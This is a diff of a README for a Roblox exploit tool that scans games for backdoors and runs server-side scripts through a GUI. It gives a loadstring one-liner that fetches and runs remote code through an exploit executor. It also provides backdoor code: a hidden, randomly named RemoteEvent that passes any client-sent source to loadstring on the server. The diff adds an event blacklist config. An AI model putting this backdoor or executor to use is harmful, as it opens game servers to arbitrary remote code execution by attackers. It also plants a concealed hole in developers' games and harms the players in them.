@@ -3,14 +3,14 @@
 might be better than [backdoor.exe](https://github.com/iK4oS/backdoor.exe) in terms of scanning.
 
 ## Info
-This script is for [Roblox](https://roblox.com) scanning backdoors and executing serversided scripts them within a gui.
+This script is for [Roblox](https://roblox.com) scanning backdoors and executing serversided scripts within a gui.
 ### Script
 Just copy the script below and execute it through your executor.
 ```lua
 loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/jLn0n/created-scripts-public/main/backdoor-executor/backdoor-executor.lua"))()
 ```
 ### Requirements
-- A non skiddy brain that needs help for dumb reason
+- A brain that can read this stuffs
 - Decent executor that supports filesystem functions (for config)
 ### Authors
 **jLn0n**
@@ -40,15 +40,27 @@ loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/jLn0n/created-sc
 	[[warn("backdoor-executor.lua needs a new name!")]]
 },
 ```
+- blacklisting events
+> it should be just like adding scripts on autoexecute, example:
+```lua
+{
+	["eventNames"] = {
+		["blacklistedNameHere"] = true
+	},
+	["eventParentNames"] = {
+		["blacklistedParentName"] = true
+	}
+},
+```
 
 ## Adding a backdoor in your game
 Get access to a game in Roblox Studio, create a script and paste the few lines of code below in the script.
 Make sure to enable `Loadstring` in `ServerScriptService`. (credits to [backdoor.exe](https://github.com/iK4oS/backdoor.exe) for me copying this thingy(and modifying it).)
 ```lua
 local Remote = Instance.new("RemoteEvent")
-Remote.Name = tostring(math.random(1e10,1e10))
+Remote.Name = tostring(math.random(1, 99999999))
 Remote.Parent = game:GetService("Chat"):WaitForChild("ClientChatModules").MessageCreatorModules
-Remote.OnServerEvent:Connect(function(player, execute)
-	loadstring(execute)()
+Remote.OnServerEvent:Connect(function(player, source)
+	loadstring(source)()
 end)
 ```
